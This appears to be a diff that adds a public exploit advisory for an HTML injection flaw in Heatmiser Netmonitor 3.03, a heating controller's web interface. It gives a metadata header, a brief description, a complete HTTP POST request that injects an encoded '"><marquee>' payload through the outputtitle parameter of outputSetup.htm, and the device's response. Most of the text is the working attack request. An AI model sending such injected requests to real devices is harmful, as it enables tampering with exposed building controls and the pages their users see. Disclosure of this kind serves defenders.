@@ -1,0 +1,43 @@
+# Exploit Title: Heatmiser Netmonitor 3.03 - HTML Injection
+# Date: 2019-12-22 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.heatmiser.com/en/
+# Hardware Link: https://www.zoneregeling.nl/heatmiser/netmonitor-handleiding.pdf
+# Software: Netmonitor v3.03
+# Product Version: Netmonitor v3.03
+# Vulernability Type: Code Injection
+# Vulenrability: HTML Injection
+# CVE: N/A
+
+# Description :
+# Heatmiser Net Monitor v3.03 allows HTML Injection via the
+# outputSetup.htm outputtitle parameter. The HTML Injection
+# vulnerability was discovered in v3.03 version of Net Monitor
+# from the Heatmiser manufacturer. This vulnerability is
+# vulnerable to hardware that use this software.
+
+
+# HTTP Post Request :
+
+POST /outputSetup.htm HTTP/1.1
+Host: XXX.XXX.XXX.XXX
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 95
+Origin: http://XXX.XXX.XXX.XXX
+Connection: close
+Referer: http://TARGET/outputSetup.htm
+Upgrade-Insecure-Requests: 1
+
+outputtitle=%22%3E%3Cmarquee%3ETEST%23undefined%23undefined%23undefined%23undefined%23undefined
+
+# HTTP Response :
+
+HTTP/1.1 200 OK
+Date: Sun, 22 Dec 2019 20:25:22 GMT
+Server: Z-World Rabbit
+Connection: close
+Content-Type: text/html
